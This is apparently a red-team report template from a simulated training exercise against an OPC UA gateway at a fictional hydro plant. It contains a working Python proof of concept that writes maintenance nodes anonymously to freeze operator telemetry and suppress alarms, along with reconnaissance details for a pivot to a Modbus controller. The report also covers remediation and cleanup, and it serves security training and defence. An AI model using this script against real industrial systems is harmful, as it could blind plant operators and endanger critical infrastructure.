# Red Team Engagement Report — OT-RB01-S01

**Operation GRID SENTINEL: PRABAL URJA | Vendor / OT Access Zone | PU-OPCUA-GW-01**  
**Engagement Type:** Red-vs-Blue Live-Fire Exercise  
**Date:** [YYYY-MM-DD]  
**Classification:** TRAINING / CONTROLLED

---

## Executive Summary

The Red Team identified an OPC UA endpoint associated with the Prabal Urja Unit-2 engineering telemetry gateway. The service permitted anonymous namespace browsing through SecurityPolicy `None` and exposed selected maintenance variables with write access. By discovering and reusing a valid maintenance work-order reference, Red activated a telemetry hold and alarm-suppression condition without authenticating as an engineer.

The action did not crash the host, stop OPC UA, or interrupt the operator console. Instead, the console continued to display last-usable values while the underlying simulated process changed. The same namespace disclosed the downstream controller `PU-GOV-PLC-02` and a Modbus/TCP relationship, providing a justified intelligence bridge to Scenario 2.

---

## Scope and Rules Observed

**Target:** `<TARGET_IP>`  
**Documented Exercise Asset:** `PU-OPCUA-GW-01` / `195.20.10.21`  
**Authorised Services:** Services discovered on the assigned target  
**Prohibited Actions:** Host exploitation, service crashing, indiscriminate denial of service, scanning outside the assigned exercise network

**Red Team Operator:** [Name]  
**Start Time:** [Timestamp]  
**End Time:** [Timestamp]

---

## Finding 1: Unauthenticated OPC UA Maintenance Parameter Modification — Critical

**CWE:**

- CWE-306 — Missing Authentication for Critical Function
- CWE-862 — Missing Authorization
- CWE-284 — Improper Access Control

**CVSS v3.1:** [Organisation-calculated score]  
**MITRE ATT&CK for ICS:** T1692.001, T0836, T0869

### Description

The OPC UA server accepts anonymous sessions through SecurityPolicy `None`. Although normal generator telemetry is read-only, the Unit-2 `TelemetryGateway` maintenance group is writable without verifying user identity, application certificate, engineering workstation, role, or independent approval.

The application checks whether the supplied work-order string matches a current reference, but that reference is itself readable in the same anonymous namespace. The work order therefore functions as a discoverable prerequisite, not an authorisation control.

### Affected Nodes

```text
PrabalUrja/HydroPlant/Unit2/TelemetryGateway/MaintenanceTicket
PrabalUrja/HydroPlant/Unit2/TelemetryGateway/MaintenanceMode
PrabalUrja/HydroPlant/Unit2/TelemetryGateway/FreezeTelemetry
PrabalUrja/HydroPlant/Unit2/TelemetryGateway/AlarmSuppression
```

### Proof of Concept

```python
import asyncio
import os
from asyncua import Client, ua

NS_URI = "urn:prabal-urja:hydro:unit2"
BASE = "PrabalUrja/HydroPlant/Unit2/TelemetryGateway"

async def main():
    endpoint = f"opc.tcp://{os.environ['TARGET_IP']}:4840"
    async with Client(url=endpoint, timeout=5) as client:
        idx = await client.get_namespace_index(NS_URI)
        changes = [
            ("MaintenanceTicket", "PU-MW-0427", ua.VariantType.String),
            ("MaintenanceMode", True, ua.VariantType.Boolean),
            ("FreezeTelemetry", True, ua.VariantType.Boolean),
            ("AlarmSuppression", True, ua.VariantType.Boolean),
        ]
        for name, value, kind in changes:
            node = client.get_node(f"ns={idx};s={BASE}/{name}")
            await node.write_value(ua.Variant(value, kind))

        accepted = await client.get_node(
            f"ns={idx};s={BASE}/OverrideAccepted"
        ).read_value()
        print("OverrideAccepted:", accepted)

asyncio.run(main())
```

### Successful Result

```text
OverrideAccepted: True
ScenarioState: UNAUTHORISED_MAINTENANCE_OVERRIDE
TelemetryQuality: UNCERTAIN_LAST_USABLE_VALUE
```

### Operational Impact

- Unit-2 values presented to the operator stop changing.
- Alarm presentation indicates an approved maintenance inhibition.
- The underlying process simulation continues to change.
- Operators may make decisions using stale information.
- Service availability remains intact, making the event less visible than a denial-of-service condition.

### Evidence

- `endpoint-discovery.txt`
- `namespace-tree.txt`
- `engineering-context.txt`
- `override-result.txt`
- `hmi-state-after.json`
- `hmi-state-after-10s.json`
- screenshots before and during the override

### Remediation

- disable anonymous write access;
- require application certificate trust and individual engineer authentication;
- remove SecurityPolicy `None` from operational endpoints;
- enforce role-based node permissions;
- validate work orders through an independent approval service;
- restrict the endpoint to approved engineering workstations;
- alert on OPC UA writes and new client sessions.

---

## Finding 2: Excessive Anonymous Engineering Metadata Exposure — High

**CWE:** CWE-200 — Exposure of Sensitive Information to an Unauthorised Actor  
**MITRE ATT&CK for ICS:** T0846 — Remote System Discovery

### Description

The anonymous OPC UA namespace exposes asset relationships that are useful for lateral movement planning. Red identified:

```text
DownstreamController = PU-GOV-PLC-02
SouthboundProtocol = Modbus/TCP
LastApprovedWorkOrder = PU-MW-0427
```

The values are operationally plausible engineering metadata, but anonymous clients do not require the complete relationship map.

### Impact

- identification of a downstream controller;
- identification of the protocol required for the next stage;
- increased precision of follow-on reconnaissance;
- reduced need for noisy scanning.

### Remediation

- expose only the minimum namespace required by each role;
- separate public health/status nodes from engineering metadata;
- require authenticated sessions for topology and mapping information;
- monitor broad browse activity and access to engineering metadata.

---

## Attack Timeline

| Time | Activity | Evidence |
|---|---|---|
| [T0] | Initial TCP discovery | Nmap output |
| [T1] | Operator console reviewed | HTTP capture / screenshot |
| [T2] | Anonymous OPC UA endpoint confirmed | endpoint discovery |
| [T3] | Unit-2 namespace browsed | namespace tree |
| [T4] | Work order and maintenance nodes identified | context output |
| [T5] | Maintenance sequence written | override output |
| [T6] | Frozen telemetry verified | two HMI state samples |
| [T7] | Downstream controller relationship recorded | context output |
| [T8] | Override cleared | cleanup output |

---

## Artifacts

- `prabal-s01-full.nmap`, `.gnmap`, `.xml`
- `prabal-s01-services.nmap`, `.gnmap`, `.xml`
- `endpoint-discovery.txt`
- `namespace-tree.txt`
- `engineering-context.txt`
- `override-result.txt`
- `hmi-state-after.json`
- `hmi-state-after-10s.json`
- `cleanup-result.txt`
- `prabal-s01-red-evidence.tar.gz`
- `prabal-s01-red-evidence.tar.gz.sha256`

---

## Pivot

**Next asset identifier:** `PU-GOV-PLC-02`  
**Next zone:** Hydro Plant Control Zone (`195.40.10.0/24`)  
**Southbound protocol:** Modbus/TCP

No Scenario 2 IP or credential was obtained from a hidden flag. The asset relationship was discovered through the real OPC UA information model. Red must wait for exercise-controller authorisation before proceeding.

---

## Cleanup Confirmation

```text
MaintenanceMode=False
FreezeTelemetry=False
AlarmSuppression=False
MaintenanceTicket=""
OverrideAccepted=False
ScenarioState=NORMAL_OPERATION
```

**Cleanup Time:** [Timestamp]  
**Service Availability After Cleanup:** [Confirmed / Not Confirmed]
